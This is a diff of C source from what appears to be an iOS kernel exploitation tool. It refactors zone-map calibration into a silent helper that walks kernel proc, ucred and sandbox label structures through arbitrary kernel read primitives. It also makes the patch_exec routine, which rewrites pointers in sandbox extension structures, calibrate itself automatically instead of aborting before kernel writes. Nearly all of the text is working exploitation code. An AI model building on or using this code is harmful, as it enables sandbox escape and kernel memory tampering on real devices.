@@ -232,44 +232,17 @@ static void kread_string(uint64_t kaddr, char *out, size_t maxlen) {
 extern uint64_t g_kernel_base;
 extern uint64_t g_kernel_slide;
 
-char *kresearch_detect_zones(void) {
-    buf_init();
-    buf_append("=== ZONE RANGE DETECTION ===\n\n");
-    buf_append("Detects zone MAP bounds (where heap objects live) and zone\n");
-    buf_append("METADATA bounds (unmapped by SPTM — reads/writes panic).\n");
-    buf_append("MUST run this before patch_exec — writes refuse without it.\n\n");
-
-    buf_append("kernel_base:  0x%llx\n", g_kernel_base);
-    buf_append("kernel_slide: 0x%llx\n\n", g_kernel_slide);
-
-    buf_append("Current zone_meta exclusion:\n");
-    buf_append("  min: 0x%llx\n", g_zone_meta_min);
-    buf_append("  max: 0x%llx\n", g_zone_meta_max);
-    buf_append("  detected: %s\n\n", g_zone_meta_detected ? "YES" : "NO (stale defaults)");
-
-    buf_append("Current zone_map bounds:\n");
-    buf_append("  min: 0x%llx\n", g_zone_map_min);
-    buf_append("  max: 0x%llx\n", g_zone_map_max);
-    buf_append("  detected: %s\n\n", g_zone_map_detected ? "YES" : "NO (writes blocked)");
-
-    // ── Probe known-good heap addresses to infer zone map bounds ──
+// Silent helper: probes heap addresses, computes bounds, sets globals.
+// Does NOT touch buf_* — safe to call from any context.
+// Returns true if zone map bounds were successfully determined.
+static bool calibrate_zone_bounds(void) {
     uint64_t self_proc = proc_self();
-    if (!self_proc) {
-        buf_append("ABORT: proc_self() returned NULL\n");
-        return buf_finish();
-    }
+    if (!self_proc) return false;
 
     uint64_t proc_ro = kread_ptr(self_proc + off_proc_p_proc_ro);
     uint64_t ucred   = kread_ptr(proc_ro + off_proc_ro_p_ucred);
     uint64_t label   = kread_ptr(ucred + off_ucred_cr_label);
     uint64_t sbx     = kread_ptr(label + off_label_l_perpolicy_sandbox);
-
-    buf_append("Known-good heap addresses (our process):\n");
-    buf_append("  proc:        0x%llx\n", self_proc);
-    buf_append("  proc_ro:     0x%llx\n", proc_ro);
-    buf_append("  ucred:       0x%llx\n", ucred);
-    buf_append("  label:       0x%llx\n", label);
-    buf_append("  sandbox_lbl: 0x%llx\n", sbx);
 
     // Collect ALL heap addresses we can find to determine zone map bounds
     uint64_t heap_addrs[64];
@@ -291,19 +264,16 @@ char *kresearch_detect_zones(void) {
         uint64_t ext_set = (uint64_t)sbx_lbl.extension_set;
         if (ext_set && kaddr_ok(ext_set)) {
             RECORD(ext_set);
-            buf_append("  ext_set:     0x%llx\n", ext_set);
             uint64_t buckets[SANDBOX_EXT_NUM_BUCKETS];
             kreadbuf(ext_set, buckets, sizeof(buckets));
             for (int i = 0; i < SANDBOX_EXT_NUM_BUCKETS; i++) {
                 if (buckets[i] && kptr_ok(buckets[i])) {
                     RECORD(buckets[i]);
-                    // Read class_node to get extension list pointers
                     uint8_t cn_raw[0x20];
                     kreadbuf(buckets[i], cn_raw, 0x20);
                     uint64_t cn_ext = *(uint64_t *)(cn_raw + CN_OFF_EXT);
                     if (cn_ext && kptr_ok(cn_ext)) {
                         RECORD(cn_ext);
-                        // Get extension data_ptr
                         uint8_t eraw[EXT_RAW_SIZE];
                         kreadbuf(cn_ext, eraw, EXT_RAW_SIZE);
                         uint64_t data_ptr = *(uint64_t *)(eraw + EXT_OFF_DATA);
@@ -323,14 +293,9 @@ char *kresearch_detect_zones(void) {
         if (heap_count < 64) heap_addrs[heap_count++] = launchd;
     }
 
-    buf_append("\nCollected %d heap addresses for analysis.\n", heap_count);
+    if (heap_count < 2) return false;
 
-    if (heap_count < 2) {
-        buf_append("Too few addresses — cannot determine zone map bounds.\n");
-        return buf_finish();
-    }
-
-    // Sort and find min/max to determine zone map range
+    // Sort and find min/max
     for (int i = 0; i < heap_count - 1; i++)
         for (int j = i + 1; j < heap_count; j++)
             if (heap_addrs[i] > heap_addrs[j]) {
@@ -342,25 +307,13 @@ char *kresearch_detect_zones(void) {
     uint64_t observed_min = heap_addrs[0];
     uint64_t observed_max = heap_addrs[heap_count - 1];
 
-    buf_append("\nObserved heap range: 0x%llx - 0x%llx\n", observed_min, observed_max);
-    buf_append("Span: 0x%llx bytes (%.1f GB)\n",
-               observed_max - observed_min,
-               (double)(observed_max - observed_min) / (1024.0*1024.0*1024.0));
-
-    // The zone map is typically 24 GB centered around our observed allocations.
-    // We expand conservatively: 8 GB below min, 8 GB above max.
-    // This covers all GEN0-GEN3 + DATA + VM + RO regions.
-    uint64_t expand = 0x200000000ULL; // 8 GB
+    // Expand: 8 GB below min, 8 GB above max
+    uint64_t expand = 0x200000000ULL;
     uint64_t map_min = (observed_min > expand) ? (observed_min - expand) : VM_MIN_KERNEL_ADDRESS;
     uint64_t map_max = observed_max + expand;
-    if (map_max < observed_max) map_max = VM_MAX_KERNEL_ADDRESS; // overflow guard
+    if (map_max < observed_max) map_max = VM_MAX_KERNEL_ADDRESS;
 
-    buf_append("\nDerived zone map bounds (observed ± 8 GB):\n");
-    buf_append("  zone_map_min: 0x%llx\n", map_min);
-    buf_append("  zone_map_max: 0x%llx\n", map_max);
-
-    // Try to refine zone_meta by looking for freed-zone-list pointers
-    // in our bucket walk (pointers into zone metadata region)
+    // Try to refine zone_meta from bucket walk
     uint64_t meta_candidates[32];
     int meta_count = 0;
     if (sbx) {
@@ -372,8 +325,6 @@ char *kresearch_detect_zones(void) {
             kreadbuf(ext_set, buckets, sizeof(buckets));
             for (int i = 0; i < SANDBOX_EXT_NUM_BUCKETS; i++) {
                 if (buckets[i] && !kptr_ok(buckets[i]) && !is_kernel_static(buckets[i])) {
-                    // This bucket pointer isn't a valid struct but IS a kernel addr
-                    // — likely a freed zone pointer into zone metadata
                     if (meta_count < 32) meta_candidates[meta_count++] = buckets[i];
                 }
             }
@@ -386,14 +337,9 @@ char *kresearch_detect_zones(void) {
             if (meta_candidates[i] < meta_lo) meta_lo = meta_candidates[i];
             if (meta_candidates[i] > meta_hi) meta_hi = meta_candidates[i];
         }
-        // Expand by 32 MB each side
         uint64_t meta_margin = 0x2000000ULL;
         meta_lo = (meta_lo > meta_margin) ? meta_lo - meta_margin : 0;
         meta_hi += meta_margin;
-
-        buf_append("\nDetected %d zone-meta candidates:\n", meta_count);
-        buf_append("  Refined meta range: 0x%llx - 0x%llx\n", meta_lo, meta_hi);
-
         g_zone_meta_min = meta_lo;
         g_zone_meta_max = meta_hi;
         g_zone_meta_detected = true;
@@ -403,6 +349,32 @@ char *kresearch_detect_zones(void) {
     g_zone_map_min = map_min;
     g_zone_map_max = map_max;
     g_zone_map_detected = true;
+    return true;
+}
+
+char *kresearch_detect_zones(void) {
+    buf_init();
+    buf_append("=== ZONE RANGE DETECTION ===\n\n");
+    buf_append("Detects zone MAP bounds (where heap objects live) and zone\n");
+    buf_append("METADATA bounds (unmapped by SPTM — reads/writes panic).\n\n");
+
+    buf_append("kernel_base:  0x%llx\n", g_kernel_base);
+    buf_append("kernel_slide: 0x%llx\n\n", g_kernel_slide);
+
+    buf_append("Before calibration:\n");
+    buf_append("  zone_meta: 0x%llx - 0x%llx  detected=%s\n",
+               g_zone_meta_min, g_zone_meta_max,
+               g_zone_meta_detected ? "YES" : "NO (stale defaults)");
+    buf_append("  zone_map:  0x%llx - 0x%llx  detected=%s\n\n",
+               g_zone_map_min, g_zone_map_max,
+               g_zone_map_detected ? "YES" : "NO (writes blocked)");
+
+    buf_append("Probing heap addresses...\n");
+    bool ok = calibrate_zone_bounds();
+    if (!ok) {
+        buf_append("FAILED: could not determine zone map bounds.\n");
+        return buf_finish();
+    }
 
     buf_append("\n=== APPLIED ===\n");
     buf_append("zone_map:  0x%llx - 0x%llx  (writes now allowed in this range)\n",
@@ -2818,16 +2790,18 @@ char *kresearch_patch_exec(void) {
     buf_append("buffer, redirects class_name POINTER in class_node struct.\n\n");
     bc("patch_exec v7 starting\n");
 
-    // SAFETY: require zone map detection before any writes
+    // Auto-calibrate zone map if not done yet
     if (!g_zone_map_detected) {
-        buf_append("ABORT: Zone map bounds not detected.\n");
-        buf_append("Run 'Detect Zones' first to calibrate address validation.\n");
-        buf_append("Without zone map bounds, we cannot verify write targets\n");
-        buf_append("are in mapped heap memory (v6 panicked writing to 0xffffffddac190230\n");
-        buf_append("which was outside the zone map).\n");
-        bc("ABORT: zone map not detected, run detect_zones first\n");
-        bc_close();
-        return buf_finish();
+        buf_append("Zone map not calibrated — auto-calibrating...\n");
+        bc("auto-calibrating zone bounds\n");
+        bool cal_ok = calibrate_zone_bounds();
+        if (!cal_ok || !g_zone_map_detected) {
+            buf_append("ABORT: zone calibration failed — cannot determine safe write range.\n");
+            bc("ABORT: calibration failed\n");
+            bc_close();
+            return buf_finish();
+        }
+        buf_append("Zone bounds calibrated successfully.\n");
     }
     buf_append("Zone map: 0x%llx - 0x%llx (calibrated)\n", g_zone_map_min, g_zone_map_max);
     buf_append("Zone meta: 0x%llx - 0x%llx (excluded)\n\n", g_zone_meta_min, g_zone_meta_max);
